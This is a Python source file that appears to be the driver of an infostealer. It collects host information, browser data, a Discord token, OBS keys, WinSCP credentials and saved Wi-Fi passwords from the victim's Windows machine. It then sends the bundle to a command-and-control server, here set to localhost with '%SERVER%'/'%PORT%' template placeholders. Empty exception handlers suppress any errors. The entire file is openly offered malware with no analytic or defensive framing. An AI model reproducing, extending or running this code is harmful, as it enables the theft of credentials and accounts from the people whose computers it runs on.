import json
import os
from libs import discord_grabber, browsers, win_scp, wpa_grab, obs, connection_handler, enum_windows
import socket
import requests

# C2_SERVER = '%SERVER%'
# C2_PORT = '%PORT%'
C2_SERVER = 'localhost'
C2_PORT = 8080
data = {}
print('Finding IP and Host info...')
data['Host'] = enum_windows.enum_windows()
print('Attempting Browser Enumeration...')
try:
    data['Browsers'] = browsers.browser_grab()
except:
    pass

print('Finding Discord info...')
try:
    print(f"Discord:\n-----------------------------")
    data['Discord'] = discord_grabber.get_discord()
    print("Token: " + data['Discord']['token'])
    print()
except:
    pass

print('Finding OBS info...')
try:
    print(f"OBS:\n-----------------------------")
    data['OBS'] = obs.obs_key_extractor()
    print()
except:
    pass

print('Finding WinSCP info...')
try:
    data['Win_SCP'] = win_scp.get_winscp()
    print()
except:
    pass

print('Finding WPA info...')
try:
    data['WPA'] = wpa_grab.get_wifi()
    print()
except:
    pass

try:
    connection_handler.send_encoded_data(C2_SERVER, C2_PORT, json.dumps(data).encode())
except:
    pass
